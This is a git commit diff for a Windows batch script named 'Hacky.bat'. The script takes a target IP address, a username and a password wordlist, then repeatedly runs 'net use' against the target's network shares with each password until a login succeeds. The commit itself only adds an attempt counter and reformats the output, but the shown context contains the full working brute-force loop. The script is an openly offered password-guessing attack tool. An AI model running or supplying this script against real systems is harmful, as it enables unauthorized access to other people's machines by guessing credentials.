ca1b44a07580c1c8b9502b692653f498257dde44
Abdullah <umarabdullahali2020@gmail.com>
2025-04-05 11:04:08 +0500

    Hacky.bat

--- Hacky/Hacky.bat.bat
+++ Hacky/Hacky.bat.bat
@@ -1,5 +1,5 @@
 @echo off
-title Hacky
+title Hacky 
 color A
 echo.
 echo        ======================================
@@ -18,6 +18,7 @@ set /p ip="Enter IP Address: "
 set /p user="Enter Username: "
 set /p wordlist="Enter Password List: "
 
+set /a count = 1
 for /f %%a in (%wordlist%) do (
   set pass=%%a
   call :attempt
@@ -28,12 +29,13 @@ exit
 
 :success
 echo.
-echo Password Found! %pass%
+echo Password Found! {%pass%}
 net use \\%ip% /d /y >nul 2>&1
 pause
 exit
 
 :attempt
 net use \\%ip% /user:%user% %pass% >nul 2>&1
-echo ATTEMPT : %pass%
+echo [ATTEMPT %count% : (%pass%)]
+set /a count = %count% + 1
 if %errorlevel% EQU 0 goto success
